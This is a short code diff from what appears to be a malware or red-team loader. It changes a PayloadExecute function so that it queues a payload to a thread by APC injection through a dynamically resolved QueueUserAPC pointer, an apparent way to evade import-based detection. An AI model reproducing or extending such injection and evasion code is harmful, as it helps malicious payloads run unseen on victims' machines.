@@ -27,7 +27,7 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pP
 		return FALSE;
 	}
 
-	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
+	if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
 		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
